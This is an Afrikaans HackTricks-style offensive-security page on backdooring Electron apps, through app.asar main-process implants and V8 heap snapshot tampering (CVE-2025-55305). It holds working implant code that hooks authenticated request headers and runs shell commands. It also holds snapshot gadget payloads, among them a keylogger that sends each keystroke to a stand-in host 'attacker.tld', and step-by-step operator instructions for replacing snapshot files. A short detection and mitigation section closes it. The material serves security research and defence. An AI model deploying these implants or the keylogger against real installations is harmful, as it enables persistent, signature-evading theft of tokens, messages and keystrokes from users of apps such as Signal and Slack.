# Electron Plaaslike Kode-inspuiting en Snapshot-peutery

{{#include ../../banners/hacktricks-training.md}}

## Electron Plaaslike Kode-inspuiting

As jy ’n plaaslik geïnstalleerde Electron-toepassing kan wysig of instrumenteer, kan jy dit dalk arbitrêre JavaScript laat uitvoer. Sien:


{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md
{{#endref}}

Sien [Node inspector/CEF debug abuse](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md) vir ’n plaaslike Node inspector- of Chromium DevTools-ontfoutingskoppelvlak.

## Post-exploitation: ASAR/main-process-inplantings

As jy **skryftoegang** tot ’n Electron-toepassing se hulpbrongids kry, is ’n baie praktiese post-exploitation-primitief om **`app.asar`** (of die JS-ingangspunt wat dit laai) te **wysig** en te wag totdat die gebruiker die toepassing weer begin. Anders as ’n XSS wat net die renderer raak, loop kode wat uit die **main process** gelaai word in die toepassing se **Node.js-runtime**; dit kan dus gewoonlik toegang tot die **lêerstelsel** kry, opdragte laat loop, Electron-API’s onderskep en die geverifieerde toepassingstoestand inspekteer.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

Tipiese werksvloei:

1. Pak `app.asar` uit en identifiseer die werklike bootstrap-lêer vanuit `package.json` (`main`) of die bestaande opstartlogika.
2. Voeg ’n klein laaier in die **main process** (of ’n preload/main-process-hook) by en pak die argief weer.
3. Wag totdat die toepassing weer begin, en gebruik die inplanting om looptyddata vas te lê nadat die gebruiker die desktop-toepassing ontsluit of daarby geverifieer het.

Minimale voorbeeld van ’n bootstrap-pleister:

```javascript
// Added near the application main entrypoint
const cp = require("child_process")
const { session } = require("electron")

session.defaultSession.webRequest.onBeforeSendHeaders((details, callback) => {
  // Inspect or copy authenticated headers/tokens here
  callback({ requestHeaders: details.requestHeaders })
})

cp.exec("id")
```

Praktiese implikasies:

- **Diefstal van vertroude-kliëntdata**: sodra die desktop-app data vir die gebruiker dekripteer of laai, kan die implant dit tydens runtime lees. Daarom bly **E2EE-boodskapkliënte** (Signal/Slack/Mattermost) en **kluis-/geheimenissebestuurders** interessante teikens op die endpoint-laag.
- **Misb gebruik van sessies/tokens**: Electron-implants kan app-koekies, bearer-tokens, versoekopskrifte, workspace-lêers of repo-aanmeldbewyse steel wat vir die lopende kliënt beskikbaar is (byvoorbeeld geënkripteerde VS Code-uitbreidings of Git-integrasies).
- **Pivotering binne die slagoffer se konteks**: ’n aangepaste app kan versoeke via die slagoffer se werkstasie proxy, en sodoende die slagoffer se IP, TLS-fingerprint en toepassingsessie hergebruik in plaas daarvan om net rou tokens te exfiltreer.

> [!NOTE]
> As die teiken **ASAR-integriteit** / **OnlyLoadAppFromAsar** of versterkte Electron-**fuses** geaktiveer het, het jy dalk ’n ander plaaslike kode-laaiprimitive nodig (byvoorbeeld fuse-misbruik of snapshot-peutering). Sien die macOS-spesifieke injection-bladsy vir meer plaaslike implant-opsies en fuse-besonderhede.

## Plaaslike backdooring deur V8-heap-snapshot-peutering (Electron/Chromium) – CVE-2025-55305

Electron- en Chromium-gebaseerde apps deserialiseer tydens opstart ’n voorafgeboude V8-heap-snapshot (v8_context_snapshot.bin, en opsioneel browser_v8_context_snapshot.bin) om elke V8-isolate (main, preload, renderer) te initialiseer. Histories het Electron se integriteits-fuses hierdie snapshots nie as uitvoerbare inhoud beskou nie, en daarom het hulle beide fuse-gebaseerde integriteitsafdwinging en OS-kodesigneringkontroles vrygespring. Gevolglik het die vervanging van die snapshot in ’n gebruiker-skryfbare installasie stealthy, volgehoue kode-uitvoering binne die app moontlik gemaak sonder om die ondertekende binaries of ASAR te wysig.<sup>[[2]](#references)</sup>

Kernpunte
- Integriteitsgaping: EnableEmbeddedAsarIntegrityValidation en OnlyLoadAppFromAsar valideer app-JavaScript binne die ASAR, maar het nie V8-heap-snapshots gedek nie (CVE-2025-55305). Chromium kontroleer ook nie die integriteit van snapshots nie.<sup>[[3]](#references)[[4]](#references)</sup>
- Voorvereistes vir aanval: Plaaslike lêerskryf na die app se installasiegids. Dit kom algemeen voor op stelsels waar Electron-apps of Chromium-blaaiers in gebruiker-skryfbare paaie geïnstalleer is (bv. %AppData%\Local op Windows; /Applications met voorbehoude op macOS).
- Effek: Betroubare uitvoering van aanvaller-JavaScript in enige isolate deur ’n gereeld gebruikte ingeboude funksie (’n “gadget”) te vervang, wat persistence en omseiling van kodesignering-verifikasie moontlik maak.
- Geaffekteerde oppervlak: Electron-apps (selfs met fuses geaktiveer) en Chromium-gebaseerde blaaiers wat snapshots vanaf gebruiker-skryfbare liggings laai.

Genereer ’n kwaadwillige snapshot sonder om Chromium te bou
- Gebruik die voorafgeboude electron/mksnapshot om ’n payload-JS in ’n snapshot te compileer en die toepassing se v8_context_snapshot.bin te vervang.<sup>[[5]](#references)[[6]](#references)</sup>

Voorbeeld van ’n minimale payload (bewys uitvoering deur ’n crash af te dwing)
```js
// Build snapshot from this payload
// npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
// Replace the application’s v8_context_snapshot.bin with the generated file

const orig = Array.isArray;

// Use Array.isArray as a ubiquitous gadget
Array.isArray = function () {
  // Executed whenever the app calls Array.isArray
  throw new Error("testing isArray gadget");
};
```

Isolate-bewuste payload-roetering (voer verskillende kode in main vs. renderer uit)
- Main-prosesopsporing: Node-only-globals soos process.pid, process.binding() of process.dlopen is in die main-proses-isolate beskikbaar.
- Browser-/renderer-opsporing: Browser-only-globals soos alert is beskikbaar wanneer dit in ’n dokumentkonteks loop.

Voorbeeld-gadget wat main-proses-Node-vermoëns een keer toets
```js
const orig = Array.isArray;

Array.isArray = function() {
  // Defer until we land in main (has Node process)
  try {
    if (!process || !process.pid) {
      return orig(...arguments);
    }
  } catch (_) {
    return orig(...arguments);
  }

  // Run once
  if (!globalThis._invoke_lock) {
    globalThis._invoke_lock = true;
    console.log('[payload] isArray hook started ...');

    // Capability probing in main
    console.log(`[payload] unconstrained fetch available: [${fetch ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained fs available: [${process.binding('fs') ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained spawn available: [${process.binding('spawn_sync') ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained dlopen available: [${process.dlopen ? 'y' : 'n'}]`);
    process.exit(0);
  }
  return orig(...arguments);
};
```

PoC vir datadiefstal uit renderer-/browser-context (bv. Slack)
```js
const orig = Array.isArray;
Array.isArray = function() {
  // Wait for a browser context
  try {
    if (!alert) {
      return orig(...arguments);
    }
  } catch (_) {
    return orig(...arguments);
  }

  if (!globalThis._invoke_lock) {
    globalThis._invoke_lock = true;
    setInterval(() => {
      window.onkeydown = (e) => {
        fetch('http://attacker.tld/keylogger?q=' + encodeURIComponent(e.key), {mode: 'no-cors'})
      }
    }, 1000);
  }
  return orig(...arguments);
};
```

Operator-werkvloei
1) Skryf payload.js wat ’n algemene ingeboude funksie (bv. Array.isArray) oorheers en opsioneel per isolate vertak.
2) Bou die snapshot sonder Chromium-bronkode:
   - npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
3) Vervang die snapshot-lêer(s) van die teikentoepassing:
   - v8_context_snapshot.bin (altyd gebruik)
   - browser_v8_context_snapshot.bin (as die LoadBrowserProcessSpecificV8Snapshot-fuse gebruik word)
4) Begin die toepassing; die gadget word uitgevoer wanneer die gekose ingeboude funksie gebruik word.

Notas en oorwegings
- Omseiling van integriteits- en handtekeningkontroles: Snapshot-lêers word nie deur kodeondertekeningskontroles as oorspronklike uitvoerbare lêers behandel nie, en is histories nie deur Electron-fuses of Chromium-integriteitskontroles gedek nie.
- Volharding: Die vervanging van die snapshot in ’n installasie wat deur die gebruiker geskryf kan word, hou gewoonlik ná herbegin van die toepassing stand en lyk soos ’n geldige, ondertekende toepassing.
- Chromium-blaaiers: Dieselfde peuterkonsep is van toepassing op Chrome/afgeleides wat op plekke geïnstalleer is waar die gebruiker kan skryf. Chrome het ander integriteitsversagtings, maar sluit fisies plaaslike aanvalle uitdruklik uit sy bedreigingsmodel uit.<sup>[[9]](#references)[[10]](#references)</sup>

Opsporing en versagtings
- Behandel snapshots as uitvoerbare inhoud en sluit dit by integriteitsafdwinging in (CVE-2025-55305-regstelling).
- Verkies installasieliggings waar slegs administrateurs kan skryf; stel basislyne vas en monitor hashes vir v8_context_snapshot.bin en browser_v8_context_snapshot.bin.
- Bespeur die oorheersing van ingeboude funksies vroeg tydens looptyd en onverwagte snapshot-veranderinge; waarsku wanneer gedeserialiseerde snapshots nie met verwagte waardes ooreenstem nie.

## References

- [1] [JS-Tap v3: Eindpunt-post-exploitation met JavaScript-inplantings](https://trustedsec.com/blog/js-tap-v3-endpoint-post-exploitation-with-javascript-implants)
- [2] [Omseiling van kode-integriteitskontroles om Signal, 1Password, Slack en meer plaaslik met agterdeure te besmet](https://blog.trailofbits.com/2025/09/03/subverting-code-integrity-checks-to-locally-backdoor-signal-1password-slack-and-more/)
- [3] [Electron-fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [4] [Electron ASAR-integriteit](https://www.electronjs.org/docs/latest/tutorial/asar-integrity)
- [5] [V8-aangepaste opstartsnapshots](https://v8.dev/blog/custom-startup-snapshots)
- [6] [electron/mksnapshot](https://github.com/electron/mksnapshot)
- [7] [MITRE ATT&CK T1218.015](https://attack.mitre.org/techniques/T1218/015/)
- [8] [Loki C2](https://github.com/boku7/Loki/)
- [9] [Chromium: Deaktiveer die laai van ongetekende kode (CIG)](https://chromium.googlesource.com/chromium/src/+/refs/heads/lkgr/docs/design/sandbox.md#disable-loading-of-unsigned-code-cig)
- [10] [Chrome-sekuriteitsvrae: fisies plaaslike aanvalle val buite die omvang](https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#why-arent-physically_local-attacks-in-chromes-threat-model)
{{#include ../../banners/hacktricks-training.md}}
